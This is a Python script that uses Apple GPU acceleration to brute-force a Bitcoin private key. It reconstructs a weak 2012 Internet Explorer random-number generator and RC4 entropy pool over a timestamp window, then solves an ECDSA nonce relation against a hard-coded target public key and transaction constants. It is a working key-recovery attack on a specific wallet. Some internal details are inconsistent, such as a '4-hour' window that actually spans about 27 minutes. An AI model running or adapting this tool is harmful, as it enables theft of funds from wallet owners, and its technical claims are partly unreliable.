import sys
import time
import torch
from ecdsa import SigningKey, SECP256k1

# --- SECP256K1 CURVE ORDER CONSTANT ---
Q = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# Enforce native Apple Silicon Metal Acceleration (MPS)
if not torch.backends.mps.is_available():
    print("[-] Fatal Error: Metal Performance Shaders (MPS) are not active.")
    sys.exit(1)
else:
    print("[*] =====================================================================")
    print("[*] MAC MINI M4 PRO GPU ENGINE ACTIVATED: INTERNET EXPLORER TARGET")
    print("[*] Architecture: Metal Performance Shaders (MPS) Core Array")
    print("[*] Engine Module: Chakra 2012 Linear Congruential Generator (LCG)")
    print("[*] =====================================================================\n")
    device = torch.device("mps")

class MetalIEPRNG:
    """
    Vectorized 2012 Internet Explorer LCG Engine running inside M4 Pro GPU memory.
    """
    def __init__(self, seed_ms_tensor):
        # Force strict 32-bit integer registers matching early Chakra behavior
        self.state = seed_ms_tensor & 0xFFFFFFFF

    def generate_random_floats_matrix(self, count=130):
        batch_size = self.state.shape[0]
        # Allocate container in Metal VRAM
        floats_matrix = torch.zeros((batch_size, count), dtype=torch.float32, device=device)
        
        for step in range(count):
            # Parallel vector calculation: state = (214013 * state + 2531011) mod 2^32
            self.state = (214013 * self.state + 2531011) & 0xFFFFFFFF
            floats_matrix[:, step] = self.state.float() / 4294967296.0
            
        return floats_matrix

def run_host_verification_loop(cpu_ms, cpu_floats, inv_t, u, target_pubkey_hex):
    pool = bytearray(256)
    candidate_bytes = bytearray(32)
    S = list(range(256))
    
    for idx, current_ms in enumerate(cpu_ms):
        float_sequence = cpu_floats[idx]
        
        # Sweep through all possible low-order mouse movement variations
        for noise_byte in range(0, 256):
            pptr = 0
            pool[pptr] = current_ms & 255; pptr += 1
            pool[pptr] = (current_ms >> 8) & 255; pptr += 1
            pool[pptr] = (current_ms >> 16) & 255; pptr += 1
            pool[pptr] = (current_ms >> 24) & 255; pptr += 1
            
            float_idx = 0
            while pptr < 256 and float_idx < 130:
                r = float_sequence[float_idx]
                float_idx += 1
                t_val = int(65536.0 * r) & 0xFFFF
                pool[pptr] = (t_val >> 8) ^ noise_byte
                pptr += 1
                if pptr < 256:
                    pool[pptr] = (t_val & 255) ^ noise_byte
                    pptr += 1
                    
            # Initialize Arcfour (RC4) Key Scheduling Phase (KSP)
            for i in range(256): S[i] = i
            j = 0
            for i in range(256):
                j = (j + S[i] + pool[i]) & 255
                S[i], S[j] = S[j], S[i]
                
            rc4_i = 0
            rc4_j = 0
            for k in range(32):
                rc4_i = (rc4_i + 1) & 255
                rc4_j = (rc4_j + S[rc4_i]) & 255
                S[rc4_i], S[rc4_j] = S[rc4_j], S[rc4_i]
                candidate_bytes[k] = S[(S[rc4_i] + S[rc4_j]) & 255]
                
            candidate_k = int.from_bytes(candidate_bytes, byteorder='big') % Q
            if candidate_k == 0: continue
            
            # Deduce private key candidate: x = t^-1 * (k - u) mod Q
            potential_x = (inv_t * (candidate_k - u)) % Q
            
            try:
                if potential_x <= 0 or potential_x >= Q: continue
                priv_key = SigningKey.from_secret_num(int(potential_x), curve=SECP256k1)
                derived_pubkey = "04" + priv_key.verifying_key.to_string("uncompressed").hex()
                
                if derived_pubkey.lower() == target_pubkey_hex.lower():
                    return current_ms, noise_byte, potential_x
            except:
                pass
    return None

def execute_gpu_ie_pipeline(t, u, target_pubkey_hex, start_ms, end_ms, chunk_size=200000):
    print(f"[*] Dispatching parallel execution grid onto M4 Pro Metal cores...")
    print(f"[*] Timeline processing block: {start_ms} --> {end_ms}")
    print("-" * 75)
    
    inv_t = int(pow(t, -1, Q))
    start_time = time.time()
    
    for batch_start in range(start_ms, end_ms + 1, chunk_size):
        batch_end = min(batch_start + chunk_size, end_ms + 1)
        
        ms_range = torch.arange(batch_start, batch_end, dtype=torch.int64, device=device)
        
        # Vectorized generation of IE Chakra LCG float matrices on the GPU
        prng_engine = MetalIEPRNG(ms_range)
        gpu_floats_matrix = prng_engine.generate_random_floats_matrix(count=130)
        
        # Map back to host thread via Apple Silicon Unified Memory
        cpu_ms = ms_range.cpu().numpy()
        cpu_floats = gpu_floats_matrix.cpu().numpy()
        
        hit_result = run_host_verification_loop(cpu_ms, cpu_floats, inv_t, u, target_pubkey_hex)
        
        if hit_result:
            found_ms, found_noise, recovered_x = hit_result
            elapsed = time.time() - start_time
            print("\n" + "="*75)
            print(f"[🎯🎯🎯 CRITICAL HIT: WALLET PRIVATE KEY RECOVERED BY IE GPU ENGINE]")
            print(f"[+] Reconstructed Seed Time: {found_ms} ms")
            print(f"[+] Recovered Mouse Byte:   {found_noise}")
            print(f"[+] Recovered Private Key:   {hex(recovered_x)}")
            print(f"[+] Execution Performance:   {elapsed:.2f} seconds")
            print("="*75 + "\n")
            return recovered_x
            
        elapsed = time.time() - start_time
        total_checks = (batch_end - start_ms) * 256
        print(f"[-] Cleared Metal pipeline grid block up to: {batch_end} | Throughput: {total_checks / elapsed:,.2f} keys/sec")
        
    print("\n[-] GPU Internet Explorer timeline search completed. No key matched inside target boundaries.")
    return None

# =====================================================================
# SYSTEM DATA INITIALIZATION BLOCK
# =====================================================================
if __name__ == "__main__":
    # Paste your parameters extracted from Input 0 of your raw transaction hex
    REAL_T_CONSTANT = 0xe2bd13264defc456c1e53b670048fde9ac004c320cd065218b915fd7f1c3d934
    REAL_U_CONSTANT = 0x0b1d3cab5ea157da3e95e821d272c7409f5d2e8c6b9fe72d697637888eea9ffc

    # 2. Paste your target 130-character uncompressed public key (Must include leading "04")
    TARGET_PUBKEY_HEX = "040ab0cc178d88300001d14ef832b1c5a33d2c75c4f27e2e4680cd51647d1983b578df37e18b1910447220f337676eb7d85f39ab875f4a2dc6e7a482e27e4452e9"

    # 3. Configure your targeted 4-hour timeline window boundaries (Right before first funding block)
    MY_START_MS = 1355594941000 
    MY_END_MS   = 1355596561000 

    if REAL_T_CONSTANT == 0x0 or TARGET_PUBKEY_HEX == "04...":
        print("[!] Data configuration required. Open this file and replace template constants.")
        sys.exit(1)
        
    execute_gpu_ie_pipeline(REAL_T_CONSTANT, REAL_U_CONSTANT, TARGET_PUBKEY_HEX, MY_START_MS, MY_END_MS)
